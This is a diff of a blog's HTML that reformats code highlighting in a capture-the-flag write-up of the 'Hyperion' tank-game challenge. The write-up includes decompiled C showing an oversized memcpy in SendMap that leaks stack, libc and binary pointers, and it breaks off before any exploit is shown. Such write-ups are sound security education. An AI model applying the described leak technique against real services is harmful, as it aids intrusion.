@@ -20,8 +20,8 @@
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css" integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk=" crossorigin="anonymous">
-    <link rel='stylesheet' href='/css/style.css' type='text/css' media='all' />
     <link rel='stylesheet' href='/css/custom.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/style.css' type='text/css' media='all' />
     <link rel='stylesheet' href='/css/syntax.css' type='text/css' media='all' />
     <link rel='stylesheet' href='/css/general.css' type='text/css' media='all' />
     <link rel='stylesheet' href='/css/toc.css' type='text/css' media='all' />
@@ -141,24 +141,10 @@
 
 <p>The challenge pops shell if its running in DEBUG environment with &ldquo;HYPERION_ENV_TEST&rdquo; environment variable set. Game also supports fork server mode and single run mode.</p>
 <p>I used the single run mode so that I can interact through <code>STDIN</code> and <code>STDOUT</code>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">socat TCP-LISTEN:1337,reuseaddr,fork exec:./hyperion_server
-</code></pre></td></tr></table>
-</div>
-</div><p>Now we can connect to the challenge server with <code>localhost</code> as IP.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">./hyperion_client localhost
-</code></pre></td></tr></table>
-</div>
-</div><h3 id="hyperion---lets-play-by-x3ero0">Hyperion - Let&rsquo;s Play by X3eRo0</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>socat TCP-LISTEN:1337,reuseaddr,fork exec:./hyperion_server
+</code></pre></div><p>Now we can connect to the challenge server with <code>localhost</code> as IP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>./hyperion_client localhost
+</code></pre></div><h3 id="hyperion---lets-play-by-x3ero0">Hyperion - Let&rsquo;s Play by X3eRo0</h3>
 
 
 
@@ -249,55 +235,28 @@
 <p>The server binary has <em><strong>SendText</strong></em>, <em><strong>SendMap</strong></em>, <em><strong>SendTank</strong></em>, <em><strong>SendBullet</strong></em> and <em><strong>SendPacket</strong></em> functions, out these SendPacket Wraps the Data to be sent in a C++ string and sends it along with the 32 bit length of the data. So, it first sends the 4 byte header which contains the length of the data to be received by the other party.</p>
 <p><em><strong>SendText</strong></em>, <em><strong>SendMap</strong></em>, <em><strong>SendTank</strong></em> and <em><strong>SendBullet</strong></em> just sends their respective data structures to the client socket.</p>
 <p>Now let&rsquo;s take a look at the main handler function which handles everything.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">Game</span>(Netsock <span style="color:#ff79c6">*</span>c, <span style="color:#ff79c6">__int64</span> some_number, <span style="color:#8be9fd">int</span> a3, <span style="color:#8be9fd">int</span> a4, <span style="color:#8be9fd">int</span> a5, <span style="color:#8be9fd">int</span> a6)
-{
-    <span style="color:#8be9fd">int</span> v7; <span style="color:#6272a4">// ecx
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v8; <span style="color:#6272a4">// er8
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v9; <span style="color:#6272a4">// er9
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v10; <span style="color:#6272a4">// rdx
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Message_; <span style="color:#6272a4">// rdx
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Tank_1; <span style="color:#6272a4">// rax
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Tank; <span style="color:#6272a4">// rax
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v14; <span style="color:#6272a4">// rax
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="color:#6272a4"></span>    <span style="color:#8be9fd">char</span> map[<span style="color:#bd93f9">38400</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-9608h] BYREF
-</span></span><span style="color:#6272a4"></span>
-    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>SendText(c, <span style="color:#f1fa8c">&#34;Welcome to Hyperion Tank Game!&#34;</span>) )
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
-    memset(map, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(map));
-    GenerateMap(map);
-    <span style="color:#8be9fd;font-style:italic">LABEL_4</span>:
-    AdjustTankPosition(tanks, map);
-    AdjustTankPosition(<span style="color:#ff79c6">&amp;</span>tanks[<span style="color:#bd93f9">1</span>], map);
-<span style="display:block;width:100%;background-color:#3d3f4a">    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>SendMap(c, map) <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>SendTank(c, tanks) )
-</span>        exit(<span style="color:#bd93f9">0</span>);
-</code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s disect this into multiple peices that we can go through one by one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">Game</span>(Netsock <span style="color:#ff79c6">*</span>c, <span style="color:#ff79c6">__int64</span> some_number, <span style="color:#8be9fd">int</span> a3, <span style="color:#8be9fd">int</span> a4, <span style="color:#8be9fd">int</span> a5, <span style="color:#8be9fd">int</span> a6)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    <span style="color:#8be9fd">int</span> v7; <span style="color:#6272a4">// ecx
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v8; <span style="color:#6272a4">// er8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v9; <span style="color:#6272a4">// er9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v10; <span style="color:#6272a4">// rdx
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Message_; <span style="color:#6272a4">// rdx
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Tank_1; <span style="color:#6272a4">// rax
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Tank; <span style="color:#6272a4">// rax
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v14; <span style="color:#6272a4">// rax
+</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">char</span> map[<span style="color:#bd93f9">38400</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-9608h] BYREF
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#6272a4"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>SendText(c, <span style="color:#f1fa8c">&#34;Welcome to Hyperion Tank Game!&#34;</span>) )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    memset(map, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(map));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    GenerateMap(map);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    <span style="color:#8be9fd;font-style:italic">LABEL_4</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    AdjustTankPosition(tanks, map);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    AdjustTankPosition(<span style="color:#ff79c6">&amp;</span>tanks[<span style="color:#bd93f9">1</span>], map);
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>SendMap(c, map) <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>SendTank(c, tanks) )
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>        exit(<span style="color:#bd93f9">0</span>);
+</code></pre></div><p>Let&rsquo;s disect this into multiple peices that we can go through one by one.</p>
 <p>So, first we will look at line 11 we see that the map has been allocated
 on the stack with 38400 ((640 * 480) / 8) bytes of size. It first sends the
 welcome text then it generates the map using some random numbers and after that
@@ -306,75 +265,36 @@ structure to the client. So, let&rsquo;s take a look at the SendMap function.</p
 <p>Before we look at the IDA&rsquo;s decompiled code, I want to mention the networking
 code of this game.</p>
 <p>The game sends packets of this structure</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> Packet {
-  std<span style="color:#ff79c6">::</span>string type;  <span style="color:#6272a4">// Use only 4-byte values.
-</span><span style="color:#6272a4"></span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">uint8_t</span><span style="color:#ff79c6">&gt;</span> data;
-};
-</code></pre></td></tr></table>
-</div>
-</div><p>the <strong>type</strong> string contains the header for identification of what kind of
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#ff79c6">struct</span> Packet {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>  std<span style="color:#ff79c6">::</span>string type;  <span style="color:#6272a4">// Use only 4-byte values.
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span style="color:#6272a4"></span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">uint8_t</span><span style="color:#ff79c6">&gt;</span> data;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>};
+</code></pre></div><p>the <strong>type</strong> string contains the header for identification of what kind of
 data are we sending and receiving. Now let&rsquo;s analyse the <strong>SendMap</strong> function, I have included comments from the source code.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span></span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">_BOOL8 <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">SendMap</span>(Netsock <span style="color:#ff79c6">*</span>socket_stuff, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>map)
-{
-    <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v2; <span style="color:#6272a4">// rax
-</span><span style="color:#6272a4"></span>    _BOOL4 v3; <span style="color:#6272a4">// ebx
-</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">/*Packet p; */</span>
-    Packet MapPacket; <span style="color:#6272a4">// [rsp+10h] [rbp-48h] BYREF
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v6; <span style="color:#6272a4">// [rsp+48h] [rbp-10h]
-</span><span style="color:#6272a4"></span>
-    <span style="color:#6272a4">/* const size_t data_sz = (MAP_W * (MAP_H + 1)) / 8; */</span>
-<span style="display:block;width:100%;background-color:#3d3f4a">    v6 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">38480LL</span>;
-</span>    <span style="color:#6272a4">/*p.type = &#34;GMAP&#34;;*/</span>
-    cplusplus_string_init(<span style="color:#ff79c6">&amp;</span>MapPacket);
-    std<span style="color:#ff79c6">::</span>__cxx11<span style="color:#ff79c6">::</span> ... <span style="color:#ff79c6">::</span>operator<span style="color:#ff79c6">=</span>(<span style="color:#ff79c6">&amp;</span>MapPacket, <span style="color:#f1fa8c">&#34;GMAP&#34;</span>); <span style="color:#6272a4">// c++ garbage redacted
-</span><span style="color:#6272a4"></span>
-    <span style="color:#6272a4">/* p.data.resize(data_sz); */</span>
-    resize(MapPacket.data, <span style="color:#bd93f9">0x9650uLL</span>);
-    v_first_element <span style="color:#ff79c6">=</span> vector_access_operator(MapPacket.data, <span style="color:#bd93f9">0LL</span>);
-<span style="display:block;width:100%;background-color:#3d3f4a">    memcpy(v_first_element, map, <span style="color:#bd93f9">38480uLL</span>);
-</span><span style="display:block;width:100%;background-color:#3d3f4a">    v3 <span style="color:#ff79c6">=</span> SendPacket(socket_stuff, <span style="color:#ff79c6">&amp;</span>MapPacket);
-</span>    <span style="color:#6272a4">/* destructor */</span>
-    func(<span style="color:#ff79c6">&amp;</span>MapPacket);
-    <span style="color:#ff79c6">return</span> v3;
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>The vulnerability here is that the <strong>data_sz</strong> is calculated incorrectly because the correct size should be
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>_BOOL8 <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">SendMap</span>(Netsock <span style="color:#ff79c6">*</span>socket_stuff, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>map)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v2; <span style="color:#6272a4">// rax
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#6272a4"></span>    _BOOL4 v3; <span style="color:#6272a4">// ebx
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">/*Packet p; */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    Packet MapPacket; <span style="color:#6272a4">// [rsp+10h] [rbp-48h] BYREF
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v6; <span style="color:#6272a4">// [rsp+48h] [rbp-10h]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#6272a4"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    <span style="color:#6272a4">/* const size_t data_sz = (MAP_W * (MAP_H + 1)) / 8; */</span>
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">38480LL</span>;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#6272a4">/*p.type = &#34;GMAP&#34;;*/</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    cplusplus_string_init(<span style="color:#ff79c6">&amp;</span>MapPacket);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    std<span style="color:#ff79c6">::</span>__cxx11<span style="color:#ff79c6">::</span> ... <span style="color:#ff79c6">::</span>operator<span style="color:#ff79c6">=</span>(<span style="color:#ff79c6">&amp;</span>MapPacket, <span style="color:#f1fa8c">&#34;GMAP&#34;</span>); <span style="color:#6272a4">// c++ garbage redacted
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#6272a4"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    <span style="color:#6272a4">/* p.data.resize(data_sz); */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    resize(MapPacket.data, <span style="color:#bd93f9">0x9650uLL</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    v_first_element <span style="color:#ff79c6">=</span> vector_access_operator(MapPacket.data, <span style="color:#bd93f9">0LL</span>);
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    memcpy(v_first_element, map, <span style="color:#bd93f9">38480uLL</span>);
+</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    v3 <span style="color:#ff79c6">=</span> SendPacket(socket_stuff, <span style="color:#ff79c6">&amp;</span>MapPacket);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    <span style="color:#6272a4">/* destructor */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    func(<span style="color:#ff79c6">&amp;</span>MapPacket);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>    <span style="color:#ff79c6">return</span> v3;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>}
+</code></pre></div><p>The vulnerability here is that the <strong>data_sz</strong> is calculated incorrectly because the correct size should be
 (MAP_W * MAP_H) / 8. This function is just giving out all the sensitive pointers on the stack to all the
 clients connecting. The leak includes <strong>stack</strong> pointers, <strong>libc</strong> pointers, and <strong>binary</strong> pointers.</p>
 
@@ -392,106 +312,53 @@ clients connecting. The leak includes <strong>stack</strong> pointers, <strong>l
 information that we need for exploitation but we still haven&rsquo;t found an exploitable vulnerability aside from
 this memory leak.</p>
 <p>Let&rsquo;s analyse next block of code.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
